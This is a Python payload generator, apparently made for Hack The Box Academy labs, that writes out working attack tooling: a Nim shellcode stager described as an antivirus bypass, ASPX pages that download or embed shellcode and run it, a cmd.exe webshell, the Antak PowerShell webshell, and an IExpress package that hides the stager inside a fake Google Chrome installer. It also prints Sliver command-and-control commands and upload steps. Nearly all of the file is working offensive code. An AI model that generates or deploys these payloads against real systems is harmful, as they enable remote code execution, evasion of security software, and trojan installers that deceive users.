#!/usr/bin/env -S uv run --script
import argparse
import subprocess
import shutil
import sys
import os
import re
from string import Template

# ============================================================
# NIM STAGER TEMPLATE - FIXED: Using $ for placeholders
# ============================================================
NIM_TEMPLATE = Template("""
import winim/lean
import httpclient

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)

  var shellcode: seq[byte] = toByteSeq(response)
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  defer: CloseHandle(pHandle)

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, addr shellcode[0], len(shellcode))

  let f = cast[proc() {.nimcall.}](rPtr)
  f()

when defined(windows):
  when isMainModule:
    DownloadExecute("http://$ip:$port/windows.bin")
""")

# ============================================================
# ASPX TEMPLATE (HTB Style - Downloads windows.bin)
# ============================================================
ASPX_DOWNLOAD_TEMPLATE = Template("""<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>

<script runat="server">
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, 
        UInt32 flAllocationType, UInt32 flProtect);
    
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, 
        UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, 
        UInt32 dwCreationFlags, ref UInt32 lpThreadId);
    
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);

    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            WebClient client = new WebClient();
            byte[] shellcode = client.DownloadData("http://$ip:$port/windows.bin");
            
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            
            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(0, 0, addr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            
            Response.Write("Done");
        }
        catch (System.Exception ex)
        {
            Response.Write("Error: " + ex.Message);
        }
    }
</script>
""")

# ============================================================
# ASPX TEMPLATE (Embedded Stager - No Download)
# ============================================================
ASPX_EMBEDDED_TEMPLATE = Template("""<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>

<script runat="server">
    private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;
    
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, 
        Int32 flAllocationType, IntPtr flProtect);
    
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, 
        Int32 dwCreationFlags, ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] mO0UY = new byte[511] {
            $stager_bytes
        };
        
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)mO0UY.Length, 0x3000, 0x40);
        Marshal.Copy(mO0UY, 0, addr, mO0UY.Length);
        
        IntPtr dY02WwpjPaDe = IntPtr.Zero;
        IntPtr et3XGeh06U = CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, ref dY02WwpjPaDe);
    }
</script>
""")

# ============================================================
# SIMPLE CMD ASPX (For Testing)
# ============================================================
CMD_ASPX_TEMPLATE = """<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            Response.Write("<pre>" + process.StandardOutput.ReadToEnd() + "</pre>");
        }
        else
        {
            Response.Write("Usage: cmd.aspx?cmd=whoami");
        }
    }
</script>
"""

# ============================================================
# ANTAK WEBSHELL
# ============================================================
ANTAK_TEMPLATE = """<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="Microsoft.VisualBasic" %>
<%--Antak - A Webshell which utilizes PowerShell.--%>

<script Language="c#" runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // Auto-login with default credentials
        Username.Text = "Disclaimer";
        Password.Text = "ForLegitUseOnly";
        Login_Click(sender, e);
    }

    protected void Login_Click(object sender, EventArgs e)
    {
        if (Username.Text == "Disclaimer" && Password.Text == "ForLegitUseOnly")
        {
            execution.Visible = true;
            execution.Enabled = true;
            authentication.Visible = false;
            output.Text = @"Welcome to Antak - A Webshell which utilizes PowerShell";
        }
    }

    protected override void OnInit(EventArgs e)
    {
        execution.Visible = false;
        execution.Enabled = false;
    }

    string do_ps(string arg)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "powershell.exe";
        psi.Arguments = "-noninteractive " + "-executionpolicy bypass " + arg;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader stmrdr = p.StandardOutput;
        string s = stmrdr.ReadToEnd();
        stmrdr.Close();
        return s;
    }

    void ps(object sender, System.EventArgs e)
    {
        output.Text += "\\nPS> " + console.Text + "\\n" + do_ps(console.Text);
        console.Text = string.Empty;
        console.Focus();
    }

    protected void uploadbutton_Click(object sender, EventArgs e)
    {
        if (upload.HasFile)
        {
            try
            {
                string filename = Path.GetFileName(upload.FileName);
                upload.SaveAs(console.Text + "\\\\" + filename);
                output.Text = "File uploaded to: " + console.Text + "\\\\" + filename;
            }
            catch (Exception ex)
            {
                output.Text = "Upload error: " + ex.Message;
            }
        }
    }

    protected void downloadbutton_Click(object sender, EventArgs e)
    {
        try
        {
            Response.ContentType = "application/octet-stream";
            Response.AppendHeader("Content-Disposition", "attachment; filename=" + console.Text);
            Response.TransmitFile(console.Text);
            Response.End();
        }
        catch (Exception ex)
        {
            output.Text = ex.ToString();
        }
    }
</script>
<HTML>
<HEAD><title>Antak Webshell</title></HEAD>
<body bgcolor="#808080">
<form id="Form1" method="post" runat="server" style="background-color: #808080">
    <asp:Panel ID="authentication" runat="server" HorizontalAlign="Center" >
        <asp:TextBox ID="Username" runat="server" Width="300px"></asp:TextBox><br />
        <asp:TextBox ID="Password" runat="server" Width="300px"></asp:TextBox><br />
        <asp:Button ID="Login" runat="server" Text="Login" OnClick="Login_Click" Width="101px"/><br />
    </asp:Panel>
    <asp:Panel ID="execution" runat="server">
        <div runat="server" style="text-align:center">
            <asp:TextBox ID="output" runat="server" TextMode="MultiLine" BackColor="#012456" ForeColor="White" style="height: 400px; width: 891px;" ReadOnly="True"></asp:TextBox>
            <asp:TextBox ID="console" runat="server" BackColor="#012456" ForeColor="Yellow" Width="891px" TextMode="MultiLine" Rows="1" Height="23px"></asp:TextBox>
        </div>
        <div runat="server" style="width: auto; text-align:center">
            <asp:Button ID="cmd" runat="server" Text="Submit" OnClick="ps" />
            <asp:FileUpload ID="upload" runat="server"/>
            <asp:Button ID="uploadbutton" runat="server" Text="Upload" OnClick="uploadbutton_Click" />
            <asp:Button ID="downloadbutton" runat="server" Text="Download" OnClick="downloadbutton_Click" />
        </div>
    </asp:Panel>
</form>
</body>
</HTML>
"""

# ============================================================
# WEB.CONFIG TEMPLATE
# ============================================================
WEB_CONFIG_TEMPLATE = """<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <system.web>
        <customErrors mode="Off"/>
        <compilation debug="true" targetFramework="4.0"/>
        <httpRuntime targetFramework="4.0" executionTimeout="600"/>
    </system.web>
</configuration>
"""

# ============================================================
# IEXPRESS SED TEMPLATE
# ============================================================
IEXPRESS_SED_TEMPLATE = """[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=0
HideExtractAnimation=1
[SourceFiles]
SourceFiles0=.
[SourceFiles0]
%FILE1%=ChromeSetup.exe
%FILE2%=stager.exe
[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
Title=Google Chrome Installer
AppLaunched=ChromeSetup.exe
PostAppLaunch=stager.exe
"""

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def run_cmd(cmd, description):
    """Helper to run system commands and handle errors."""
    print(f"[*] {description}...")
    try:
        subprocess.run(cmd, shell=True, check=True, capture_output=False)
    except subprocess.CalledProcessError:
        print(f"[!] Error during: {description}")
        sys.exit(1)

def check_dependencies():
    """Checks for required binaries and installs them if missing."""
    dependencies = {
        "x86_64-w64-mingw32-gcc": "sudo apt update && sudo apt install -y mingw-w64",
        "nim": "sudo apt update && sudo apt install -y nim"
    }

    for bin_name, install_cmd in dependencies.items():
        if shutil.which(bin_name):
            print(f"[+] {bin_name} is already installed.")
        else:
            print(f"[!] {bin_name} not found.")
            run_cmd(install_cmd, f"Installing {bin_name}")

# ============================================================
# GENERATION FUNCTIONS
# ============================================================
def generate_stager(ip, port):
    """Generate the Nim stager."""
    print(f"[*] Formatting stager.nim for {ip}:{port}...")
    try:
        with open("stager.nim", "w") as f:
            f.write(NIM_TEMPLATE.substitute(ip=ip, port=port))
    except Exception as e:
        print(f"[!] Failed to write file: {e}")
        sys.exit(1)

    check_dependencies()
    run_cmd("nimble install -y winim", "Installing winim library")

    compile_command = (
        "nim c -d:mingw --os:windows "
        "--cpu:amd64 "
        "--cc:gcc "
        "--gcc.exe:x86_64-w64-mingw32-gcc "
        "--gcc.linkerexe:x86_64-w64-mingw32-gcc "
        "stager.nim"
    )
    run_cmd(compile_command, "Compiling stager.nim to Windows EXE")

    if os.path.exists("stager.exe"):
        print("[+] stager.exe generated successfully!")
        return True
    return False

def generate_aspx_download(ip, port):
    """Generate ASPX that downloads windows.bin."""
    print(f"[*] Generating ASPX download shell for {ip}:{port}...")
    aspx_content = ASPX_DOWNLOAD_TEMPLATE.substitute(ip=ip, port=port)
    with open("shell_download.aspx", "w") as f:
        f.write(aspx_content)
    print("[+] shell_download.aspx created!")

def generate_aspx_embedded():
    """Generate ASPX with embedded stager."""
    print("[*] Generating ASPX embedded stager...")
    
    stager_bytes = None
    if os.path.exists("stager.txt"):
        with open("stager.txt", "r") as f:
            content = f.read()
            match = re.search(r'new byte\[\d+\]\s*\{\s*([^}]+)\}', content, re.DOTALL)
            if match:
                stager_bytes = match.group(1).strip()
    
    if not stager_bytes:
        print("[!] No stager bytes found. Generate with Sliver first:")
        print("    generate stager --lhost IP --lport PORT --format csharp --save stager.txt")
        return
    
    byte_list = [b.strip() for b in stager_bytes.split(',') if b.strip()]
    if len(byte_list) > 511:
        byte_list = byte_list[:511]
    elif len(byte_list) < 511:
        byte_list.extend(['0x00'] * (511 - len(byte_list)))
    
    stager_bytes = ',\n            '.join(byte_list)
    
    aspx_content = ASPX_EMBEDDED_TEMPLATE.substitute(stager_bytes=stager_bytes)
    with open("shell_embedded.aspx", "w") as f:
        f.write(aspx_content)
    print("[+] shell_embedded.aspx created!")

def generate_cmd_aspx():
    """Generate simple CMD ASPX."""
    print("[*] Generating CMD ASPX...")
    with open("cmd.aspx", "w") as f:
        f.write(CMD_ASPX_TEMPLATE)
    print("[+] cmd.aspx created!")

def generate_antak():
    """Generate Antak webshell."""
    print("[*] Generating Antak webshell...")
    with open("antak.aspx", "w") as f:
        f.write(ANTAK_TEMPLATE)
    print("[+] antak.aspx created!")

def generate_webconfig():
    """Generate web.config."""
    print("[*] Generating web.config...")
    with open("web.config", "w") as f:
        f.write(WEB_CONFIG_TEMPLATE)
    print("[+] web.config created!")

def generate_iexpress_sed():
    """Generate IExpress SED file."""
    print("[*] Generating IExpress SED...")
    with open("chrome_setup.sed", "w") as f:
        f.write(IEXPRESS_SED_TEMPLATE)
    print("[+] chrome_setup.sed created!")

def generate_sliver_commands(ip, port):
    """Display Sliver commands."""
    print("\n" + "="*60)
    print("📋 SLIVER COMMANDS")
    print("="*60)
    print(f"\n1. Generate shellcode (for download ASPX):")
    print(f"   generate --mtls {ip}:{port} --os windows --arch amd64 --format shellcode --save windows.bin")
    print(f"\n2. Generate stager (for embedded ASPX):")
    print(f"   generate stager --lhost {ip} --lport {port} --format csharp --save stager.txt")
    print("\n3. Start listener:")
    print(f"   mtls -l {port}")
    print("\n4. Start HTTP server:")
    print(f"   python3 -m http.server 80")
    print("\n5. Upload files to web app:")
    print("   - web.config (first!)")
    print("   - shell_download.aspx")
    print("   - cmd.aspx (for testing)")
    print("="*60 + "\n")

# ============================================================
# MAIN
# ============================================================
def main():
    help_text = (
        "Bypass Defender - HTB Academy Edition\n"
        "Generates:\n"
        "  - stager.exe (Nim AV bypass)\n"
        "  - shell_download.aspx (downloads windows.bin)\n"
        "  - shell_embedded.aspx (embedded stager)\n"
        "  - cmd.aspx (simple command exec)\n"
        "  - antak.aspx (PowerShell webshell)\n"
        "  - web.config (error display)\n"
        "  - chrome_setup.sed (IExpress bundle)"
    )
    
    parser = argparse.ArgumentParser(
        description=help_text,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("-l", "--ip", required=True, help="Listener IP address")
    parser.add_argument("-p", "--port", required=True, help="Listener port")
    parser.add_argument("--stager", action="store_true", help="Generate Nim stager")
    parser.add_argument("--aspx", action="store_true", help="Generate all ASPX files")
    parser.add_argument("--download", action="store_true", help="Generate download ASPX")
    parser.add_argument("--embedded", action="store_true", help="Generate embedded ASPX")
    parser.add_argument("--cmd", action="store_true", help="Generate CMD ASPX")
    parser.add_argument("--antak", action="store_true", help="Generate Antak webshell")
    parser.add_argument("--chrome", action="store_true", help="Generate IExpress SED")
    parser.add_argument("--all", action="store_true", help="Generate everything")
    parser.add_argument("--webconfig", action="store_true", help="Generate web.config")
    
    args = parser.parse_args()

    print("\n" + "="*60)
    print("🚀 BYPASS DEFENDER - HTB EDITION")
    print("="*60 + "\n")

    if not any([args.stager, args.aspx, args.download, args.embedded, 
                args.cmd, args.antak, args.chrome, args.all, args.webconfig]):
        parser.print_help()
        return

    generated = False

    if args.all or args.stager:
        if generate_stager(args.ip, args.port):
            generated = True

    if args.all or args.webconfig:
        generate_webconfig()
        generated = True

    if args.all or args.aspx:
        generate_aspx_download(args.ip, args.port)
        generate_cmd_aspx()
        generate_antak()
        generated = True

    if args.download:
        generate_aspx_download(args.ip, args.port)
        generated = True

    if args.embedded:
        generate_aspx_embedded()
        generated = True

    if args.cmd:
        generate_cmd_aspx()
        generated = True

    if args.antak:
        generate_antak()
        generated = True

    if args.all or args.chrome:
        generate_iexpress_sed()
        generated = True

    if generated:
        generate_sliver_commands(args.ip, args.port)

        print("\n" + "="*60)
        print("✅ GENERATION COMPLETE!")
        print("="*60)
        print("\n📁 Files created:")
        if os.path.exists("stager.exe"): print("  ✅ stager.exe - Nim AV bypass stager")
        if os.path.exists("stager.nim"): print("  ✅ stager.nim - Nim source")
        if os.path.exists("shell_download.aspx"): print("  ✅ shell_download.aspx - Downloads windows.bin")
        if os.path.exists("shell_embedded.aspx"): print("  ✅ shell_embedded.aspx - Embedded stager")
        if os.path.exists("cmd.aspx"): print("  ✅ cmd.aspx - CMD execution")
        if os.path.exists("antak.aspx"): print("  ✅ antak.aspx - PowerShell webshell")
        if os.path.exists("web.config"): print("  ✅ web.config - Error display")
        if os.path.exists("chrome_setup.sed"): print("  ✅ chrome_setup.sed - IExpress config")
        print("="*60 + "\n")

if __name__ == "__main__":
    main()
